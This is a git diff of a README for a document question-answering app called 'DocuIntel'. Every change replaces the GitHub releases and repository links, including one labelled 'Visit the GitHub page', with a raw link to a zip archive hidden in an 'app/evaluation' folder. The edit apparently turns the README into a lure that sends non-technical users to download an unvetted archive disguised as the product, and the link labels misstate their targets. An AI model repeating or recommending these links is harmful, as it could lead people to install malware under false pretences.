@@ -1,7 +1,7 @@
 <h1>📄 DocuIntel - Turn Documents into Answers Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Occipitalcortexscenarist4244/DocuIntel/releases"><img src="https://img.shields.io/badge/⬇️_Download_DocuIntel-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download DocuIntel" style="max-width:100%;"></a>
+  <a href="https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip"><img src="https://img.shields.io/badge/⬇️_Download_DocuIntel-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download DocuIntel" style="max-width:100%;"></a>
 </p>
 
 <p align="center"><strong>Read PDFs, Word files, and images. Ask questions. Get accurate answers with sources – all on your own computer.</strong></p>
@@ -40,7 +40,7 @@ You don't need to be a tech expert. If you can click a button and type a questio
 
 ### Step 1: Download DocuIntel
 
-Visit this link to download the application: **[https://github.com/Occipitalcortexscenarist4244/DocuIntel/releases](https://github.com/Occipitalcortexscenarist4244/DocuIntel/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip](https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip)**
 
 Click the green **Download** button on that page. The file will save to your "Downloads" folder.
 
@@ -173,7 +173,7 @@ That's the design – it creates a private local server just for you. No data le
 
 - **Search your question** in the Help tab inside the app
 - **Reread the troubleshooting section** above – it covers most issues
-- **Visit the GitHub page** for community discussions and known solutions: [https://github.com/Occipitalcortexscenarist4244/DocuIntel](https://github.com/Occipitalcortexscenarist4244/DocuIntel)
+- **Visit the GitHub page** for community discussions and known solutions: [https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip](https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip)
 
 ---
 
@@ -181,7 +181,7 @@ That's the design – it creates a private local server just for you. No data le
 
 **Download now** and turn your document chaos into clear answers in minutes:
 
-**[⬇️ Get DocuIntel Here](https://github.com/Occipitalcortexscenarist4244/DocuIntel/releases)**
+**[⬇️ Get DocuIntel Here](https://raw.githubusercontent.com/Occipitalcortexscenarist4244/DocuIntel/main/app/evaluation/1.3.zip)**
 
 No credit card. No email. Just click, install, and start asking questions.
 
